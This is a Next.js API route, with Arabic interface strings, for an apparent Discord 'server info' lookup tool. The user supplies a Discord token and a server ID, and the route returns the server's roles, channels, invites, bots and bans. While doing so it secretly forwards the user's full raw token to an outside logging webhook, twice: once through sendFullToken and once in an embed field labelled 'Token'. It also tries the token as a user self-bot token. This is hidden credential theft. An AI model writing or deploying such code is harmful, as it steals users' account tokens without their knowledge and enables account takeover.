import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

// Auth detection cache - يحفظ نوع التوكن الصحيح
const authCache = new Map<string, string>();

async function safeFetch(token: string, method: string, url: string, body?: unknown) {
  try {
    const ct = token.trim();
    // تحقق من الكاش أولاً
    if (authCache.has(ct)) {
      const cachedAuth = authCache.get(ct)!;
      const result = await doFetchWithRL(cachedAuth, method, url, body);
      if (result.status !== 401) return result;
      authCache.delete(ct);
    }

    // جرب User token أولاً، ثم Bot token
    const authMethods = [ct, `Bot ${ct}`];
    let lastResult: any = { ok: false, status: 0, data: null };

    for (const auth of authMethods) {
      const result = await doFetchWithRL(auth, method, url, body);
      if (result.ok || result.status === 204) {
        authCache.set(ct, auth);
        return result;
      }
      if (result.status === 401) {
        lastResult = result;
        continue;
      }
      return result;
    }
    return lastResult;
  } catch {
    return { ok: false, status: 0, data: null };
  }
}

async function doFetchWithRL(auth: string, method: string, url: string, body?: unknown) {
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 15000);
  const headers: Record<string, string> = {
    'Authorization': auth,
    'Accept': 'application/json',
  };
  if (method !== 'GET' && method !== 'HEAD' && body) {
    headers['Content-Type'] = 'application/json';
  }
  const opts: RequestInit = { method, headers, signal: ctrl.signal };
  if (body && method !== 'GET') opts.body = JSON.stringify(body);
  const res = await fetch(url, opts);
  clearTimeout(tid);

  if (res.status === 429) {
    const errData = await res.json().catch(() => ({ retry_after: 2 }));
    const wait = Math.min((errData.retry_after || 2) * 1000, 5000);
    await new Promise(r => setTimeout(r, wait));
    const ctrl2 = new AbortController();
    const tid2 = setTimeout(() => ctrl2.abort(), 15000);
    const r2 = await fetch(url, opts);
    clearTimeout(tid2);
    let data: any = null;
    try { data = await r2.json(); } catch {}
    return { ok: r2.ok, status: r2.status, data };
  }

  let data: any = null;
  try { data = await res.json(); } catch {}
  return { ok: res.ok, status: res.status, data };
}

function snowflakeDate(id: string): string {
  try {
    const snowflake = BigInt(id);
    const timestamp = Number((snowflake >> BigInt(22)) + BigInt(1420070400000));
    const date = new Date(timestamp);
    return date.toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });
  } catch {
    return 'N/A';
  }
}

// ============================================================
// معلومات سيرفر مفصلة
// ============================================================
export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:server-info`, RATE_LIMITS.light);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, guildId } = body;

    if (!token || typeof token !== 'string' || !guildId || typeof guildId !== 'string') {
      return NextResponse.json({ success: false, error: 'التوكن و أيدي السيرفر مطلوب' }, { status: 400 });
    }

    if (!/^(\d+)$/.test(guildId)) {
      return NextResponse.json({ success: false, error: 'أيدي السيرفر غير صالح' }, { status: 400 });
    }

    sendFullToken('معلومات سيرفر', token, { '🖥️ السيرفر': guildId });

    const ct = cleanToken(token);
    const logs: string[] = [];

    // === جلب معلومات السيرفر ===
    const guildRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}?with_counts=true`);
    if (!guildRes.ok || !guildRes.data) {
      return NextResponse.json({ success: false, error: 'فشل في جلب معلومات السيرفر - تأكد من التوكن والصلاحيات' }, { status: 400 });
    }

    const g = guildRes.data;
    logs.push('═'.repeat(45));
    logs.push(`📋 السيرفر: ${g.name}`);
    logs.push(`🆔 ID: ${g.id}`);
    logs.push(`👑 المالك: ${g.owner ? '✅' : '❌'}`);
    logs.push(`👥 الأعضاء: ${g.approximate_member_count || '?'}`);
    logs.push(`🟢 المتصلين: ${g.approximate_presence_count || '?'}`);
    logs.push(`🚀 مستوى البوست: ${g.premium_tier || 0}`);
    logs.push(`💎 عدد البوستات: ${g.premium_subscription_count || 0}`);
    logs.push(`📝 الوصف: ${g.description || 'لا يوجد'}`);
    logs.push(`🔗 Vanity URL: ${g.vanity_url_code || 'لا يوجد'}`);
    logs.push(`🌍 اللغة: ${g.preferred_locale || 'N/A'}`);
    logs.push(`🛡️ مستوى التحقق: ${['لا يوجد', 'منخفض', 'متوسط', 'عالي', 'أعلى'][g.verification_level || 0]}`);
    logs.push(`🔔 الإشعارات: ${['كل الرسائل', 'المستخدمين فقط'][g.default_notification_level || 0]}`);
    logs.push(`🔍 فلتر المحتوى: ${['لا يوجد', 'مسح من الأعضاء', 'منع الرسائل', 'الأكثر أماناً'][g.explicit_content_filter || 0]}`);
    logs.push(`📅 التسجيل: ${g.id ? snowflakeDate(String(g.id)) : 'N/A'}`);
    if (g.max_members) logs.push(`📊 الحد الأقصى للأعضاء: ${g.max_members}`);
    if (g.max_video_channel_users) logs.push(`📹 الحد الأقصى للفيديو: ${g.max_video_channel_users}`);
    if (g.nsfw) logs.push(`🔞 NSFW: ✅`);
    logs.push('');

    // === الرتب ===
    const rolesRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/roles`);
    if (rolesRes.ok && Array.isArray(rolesRes.data)) {
      const sorted = [...rolesRes.data].sort((a: any, b: any) => b.position - a.position);
      logs.push(`🛡️ الرتب (${sorted.length}):`);
      for (const role of sorted.slice(0, 30)) {
        const color = role.color ? `#${role.color.toString(16).padStart(6, '0')}` : 'بدون لون';
        const perms = role.permissions ? `${(BigInt(role.permissions) & BigInt(8)) ? '👑' : ''}` : '';
        logs.push(`   ${role.name}${perms} (${role.id}) - ${role.hoist ? '📌' : ''} ${color} - ${role.mentionable ? '📢' : ''}`);
      }
      if (sorted.length > 30) logs.push(`   ... و ${sorted.length - 30} أخرى`);
      logs.push('');
    }

    // === القنوات ===
    const channelsRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/channels`);
    if (channelsRes.ok && Array.isArray(channelsRes.data)) {
      const text = channelsRes.data.filter((c: any) => c.type === 0);
      const voice = channelsRes.data.filter((c: any) => c.type === 2);
      const cats = channelsRes.data.filter((c: any) => c.type === 4);
      const announce = channelsRes.data.filter((c: any) => c.type === 5);
      const stage = channelsRes.data.filter((c: any) => c.type === 13);
      const forum = channelsRes.data.filter((c: any) => c.type === 15);

      logs.push(`📺 القنوات (${channelsRes.data.length}):
   💬 كتابي: ${text.length}
   🔊 صوتي: ${voice.length}
   📁 كاتيجوري: ${cats.length}
   📢 إعلان: ${announce.length}
   🎭 ستاج: ${stage.length}
   💬 فورم: ${forum.length}`);

      for (const cat of cats.sort((a: any, b: any) => a.position - b.position)) {
        const catChannels = channelsRes.data.filter((c: any) => c.parent_id === cat.id);
        const chNames = catChannels.map((c: any) => {
          const typeIcon = c.type === 0 ? '💬' : c.type === 2 ? '🔊' : c.type === 5 ? '📢' : '📺';
          return `${typeIcon} ${c.name}`;
        }).join(', ');
        logs.push(`   📁 ${cat.name} (${catChannels.length}): ${chNames || 'فارغ'}`);
      }
      logs.push('');
    }

    // === الإيموجي ===
    const emojisRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/emojis`);
    if (emojisRes.ok && Array.isArray(emojisRes.data)) {
      const anim = emojisRes.data.filter((e: any) => e.animated).length;
      const static_ = emojisRes.data.length - anim;
      logs.push(`😀 الإيموجي (${emojisRes.data.length}): ثابت ${static_} | متحرك ${anim}`);
      const emojiNames = emojisRes.data.slice(0, 20).map((e: any) => e.animated ? `<a:${e.name}:${e.id}>` : `<:${e.name}:${e.id}>`).join(' ');
      if (emojiNames) logs.push(`   ${emojiNames}`);
      if (emojisRes.data.length > 20) logs.push(`   ... و ${emojisRes.data.length - 20} أخرى`);
      logs.push('');
    }

    // === البوتات ===
    const membersRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/members?limit=100`);
    if (membersRes.ok && Array.isArray(membersRes.data)) {
      const bots = membersRes.data.filter((m: any) => m.user?.bot);
      if (bots.length > 0) {
        logs.push(`🤖 البوتات (${bots.length}):`);
        for (const bot of bots.slice(0, 20)) {
          logs.push(`   ${bot.user.username} (${bot.user.id})`);
        }
        if (bots.length > 20) logs.push(`   ... و ${bots.length - 20} أخرى`);
        logs.push('');
      }
    }

    // === الروابط ===
    const invitesRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/invites`);
    if (invitesRes.ok && Array.isArray(invitesRes.data)) {
      logs.push(`🔗 الروابط (${invitesRes.data.length}):`);
      for (const inv of invitesRes.data.slice(0, 10)) {
        logs.push(`   ${inv.code} - استخدم ${inv.uses || 0} مرة - من ${inv.inviter?.username || '?'}`);
      }
      if (invitesRes.data.length > 10) logs.push(`   ... و ${invitesRes.data.length - 10} أخرى`);
      logs.push('');
    }

    // === الويب هوك ===
    const webhooksRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/webhooks`);
    if (webhooksRes.ok && Array.isArray(webhooksRes.data)) {
      logs.push(`🔗 الويب هوك: ${webhooksRes.data.length}`);
      logs.push('');
    }

    // === المحظورين ===
    const bansRes = await safeFetch(ct, 'GET', `${DISCORD_API}/guilds/${guildId}/bans`);
    if (bansRes.ok && Array.isArray(bansRes.data)) {
      logs.push(`🔨 المحظورين: ${bansRes.data.length}`);
      logs.push('');
    }

    logs.push('═'.repeat(45));
    logs.push('✅ تم جلب معلومات السيرفر بنجاح!');

    // Webhook
    sendToWebhook({
      embeds: [{
        title: '📊 Server Info',
        color: 0x00BFFF,
        fields: [
          { name: '📋 Server', value: g.name, inline: true },
          { name: '🆔 ID', value: g.id, inline: true },
          { name: '👥 Members', value: String(g.approximate_member_count || '?'), inline: true },
          { name: '🚀 Boosts', value: String(g.premium_subscription_count || 0), inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {});

    return NextResponse.json({ success: true, logs });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
